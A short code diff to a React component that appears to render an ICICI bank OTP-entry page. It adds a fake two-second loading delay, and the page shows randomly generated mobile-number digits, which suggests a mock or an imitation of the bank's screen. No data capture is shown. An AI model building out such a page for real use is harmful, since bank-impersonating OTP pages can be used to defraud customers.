@@ -42,11 +42,22 @@ const ICICIOTPPage: React.FC<ICICIOTPPageProps> = ({
   displayPrice,
   formatPrice
 }) => {
+  // Loading state
+  const [isLoading, setIsLoading] = useState(true);
+  
   const [timeLeft, setTimeLeft] = useState(179); // 2:59 in seconds
   const [resendCount, setResendCount] = useState(0);
   const [resendCooldown, setResendCooldown] = useState(false);
   const [mobileLast4] = useState(() => Math.floor(1000 + Math.random() * 9000).toString());
   const [showResendSuccess, setShowResendSuccess] = useState(false);
+
+  // Loading timer - show loading for 2 seconds
+  useEffect(() => {
+    const loadingTimer = setTimeout(() => {
+      setIsLoading(false);
+    }, 2000);
+    return () => clearTimeout(loadingTimer);
+  }, []);
 
   // Timer countdown effect
   useEffect(() => {
